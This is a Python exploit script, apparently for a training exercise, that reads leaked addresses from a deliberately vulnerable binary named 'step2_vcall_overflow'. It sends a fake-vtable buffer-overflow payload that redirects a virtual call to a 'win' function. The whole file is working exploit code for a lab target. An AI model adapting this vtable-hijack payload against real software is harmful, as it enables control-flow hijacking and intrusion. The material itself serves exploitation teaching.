import re
import struct
import subprocess
import sys


def main() -> None:
    binary = sys.argv[1] if len(sys.argv) > 1 else "./step2_vcall_overflow"

    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    win_line = proc.stdout.readline()
    buf_line = proc.stdout.readline()

    win_match = re.search(rb"0x([0-9a-fA-F]+)", win_line)
    buf_match = re.search(rb"0x([0-9a-fA-F]+)", buf_line)
    if not win_match or not buf_match:
        raise RuntimeError("failed to read win/buf addresses")

    win_addr = int(win_match.group(1), 16)
    buf_addr = int(buf_match.group(1), 16)

    fake_vtable = struct.pack("<Q", win_addr)
    payload = fake_vtable + (b"A" * (64 - 8)) + struct.pack("<Q", buf_addr)

    proc.stdin.write(payload)
    proc.stdin.close()

    rest = proc.stdout.read().decode(errors="ignore")
    print(win_line.decode(errors="ignore").strip())
    print(buf_line.decode(errors="ignore").strip())
    print(rest.strip())


if __name__ == "__main__":
    main()
